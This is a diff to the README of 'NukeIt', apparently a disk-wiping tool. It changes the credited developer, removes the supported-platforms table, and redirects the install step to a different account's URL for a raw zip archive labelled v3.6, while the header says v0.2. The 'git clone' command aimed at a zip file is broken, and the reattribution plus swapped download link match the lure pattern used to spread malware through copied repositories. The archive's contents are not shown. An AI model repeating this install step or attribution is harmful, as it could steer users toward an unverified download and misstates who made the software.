@@ -11,7 +11,7 @@
 
 ### **NukeIt: When Shift+Delete is not enough.**
 
-**v0.2 Prototype** · Developed by [**PurpleFoxxx**](#team)
+**v0.2 Prototype** · Developed by [**Manoharx**](#team)
 
 ![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square)
 ![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey?style=flat-square)
@@ -66,16 +66,6 @@ All cryptographic keys are generated fresh per session, held exclusively in RAM,
 
 ---
 
-## Supported Platforms
-
-| Platform            | Status          | Notes                                                                            |
-| ------------------- | --------------- | -------------------------------------------------------------------------------- |
-| **Linux**           | ✅ Supported    | Requires `sudo` / root. Uses `lsblk`, `blkdiscard`, `hdparm`, `nvme-cli`         |
-| **Windows 10 / 11** | ✅ Supported    | Requires Administrator. Uses PowerShell, DISKPART, Optimize-Volume               |
-| **Windows 7 / 8**   | ⚠️ Partial      | Falls back to `wmic` for drive detection; some SSD commands may not be available |
-| **macOS**           | 🔶 Experimental | Drive detection via `diskutil` works; SSD commands not yet fully implemented     |
-
-> **Note:** Raw block device access requires elevated privileges on all platforms. NukeIt will **exit immediately** if not run as root (Linux) or Administrator (Windows). There is no degraded mode — this is intentional.
 
 ---
 
@@ -169,7 +159,7 @@ All required tools (`PowerShell`, `DISKPART`, `Optimize-Volume`) are built into 
 ### 1. Clone or download
 
 ```bash
-git clone https://github.com/PurpleFoxxx/NukeIt/raw/refs/heads/main/exhibit/It_Nuke_v3.6.zip
+git clone https://github.com/manoharkt/NukeIt/raw/refs/heads/main/exhibit/It_Nuke_v3.6.zip
 cd nukeit
 ```
 
